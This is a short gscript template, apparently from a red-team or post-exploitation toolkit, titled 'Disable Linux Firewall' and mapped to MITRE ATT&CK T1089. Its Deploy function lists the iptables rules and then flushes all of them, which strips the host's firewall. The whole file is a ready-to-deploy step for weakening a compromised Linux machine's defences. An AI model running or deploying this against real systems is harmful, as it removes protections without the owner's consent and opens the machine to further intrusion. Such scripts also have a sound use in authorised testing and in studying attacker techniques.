// Example gscript template
// Title: Disable Linux Firewall
// Author: ahhh
// Purpose: Drops the linux firewall by dropping all of the iptables rules
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1089

//priority:150
//timeout:150

function BeforeDeploy() {
  LogInfo("Starting Disable Linux Firewall");
  return true; 
}

function Deploy() {  
  var response = ExecuteCommand("iptables", ["-L"]);
  LogInfo(response.retObject.Stdout);

  var response2 = ExecuteCommand("iptables", ["--flush"]);
  LogInfo(response2.retObject.Stdout);
  return true;
}

function AfterDeploy() {
  LogInfo("Done Disable Linux Firewall");
  return true;
}